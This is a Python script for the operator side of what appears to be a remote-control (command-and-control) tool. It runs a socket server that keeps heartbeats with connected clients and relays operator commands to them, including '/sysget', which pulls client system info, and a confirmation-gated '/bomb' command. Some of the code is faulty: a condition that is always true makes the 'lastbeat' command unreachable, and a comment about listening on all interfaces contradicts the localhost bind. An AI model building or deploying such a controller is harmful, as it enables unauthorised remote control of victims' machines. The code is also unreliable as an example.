import socket
import threading

import re
import time
from os import system, name


def basic_commands(command):
    global last_heartbeat_time

    if command == "help":
        available_commands = ["'help': Will display this text with all the available commands.\n",
                              "'clear': Will clear the terminal.\n",
                              "'/sysget': Get the client system info's.\n"]
        print(available_commands)
    elif command == "clear" or "cls":
        # for windows
        if name == 'nt':
            _ = system('cls')
        # for mac and linux
        else:
            _ = system('clear')
    elif command == "lastbeat":
        current_time = time.time()
        elapsed_time = current_time - last_heartbeat_time
        print(f"[*] Time since last heartbeat: {elapsed_time} seconds.")
    else:
        print("[!] Incorrect syntax. (maybe your forgot '/'?)")


last_heartbeat_time = 0  # Keep track of the time of the last heartbeat


def heartbeat(client_socket):
    global last_heartbeat_time

    while True:
        try:
            client_socket.send(b'heartbeat')
            client_socket.recv(1024)
            last_heartbeat_time = time.time()  # Update the last heartbeat time
            time.sleep(15)  # Heartbeat interval as needed
        except Exception as e:
            print(f"Heartbeat failed: {e}")
            break


def handle_client(client_socket):
    heartbeat_thread = threading.Thread(target=heartbeat, args=(client_socket,))
    heartbeat_thread.daemon = True
    heartbeat_thread.start()
    client_socket.settimeout(10)

    # Start the communication loop immediately after connecting
    try:
        while True:
            response = input(">>")
            if re.match(r'^/', response):
                response = re.sub(r'^/', '', response)
                if response == 'bomb':
                    if input("Are you sure to continue? (y/n) >").lower() != 'y':
                        continue
                print("[*] Sending..")
                client_socket.send(bytes(response, 'utf-8'))

                data = client_socket.recv(1024)
                if not data:
                    print("[!] No response received by the client.")
                    if input("Kill the server? (y/n)\n>").lower() == "y":
                        exit()
                    continue
                print(f"[#] Received: {data.decode('utf-8')}")
            else:
                basic_commands(response.lower())
    except Exception as e:
        print(f"Client communication error: {e}")

    client_socket.close()


def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('localhost', 59152))  # Listen on all available interfaces
    server.listen(5)

    print("[*] Server started. Waiting for connections...")

    while True:
        client, addr = server.accept()
        print(f"[*] Connection established with {addr[0]}:{addr[1]}")

        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()


if __name__ == "__main__":
    start_server()
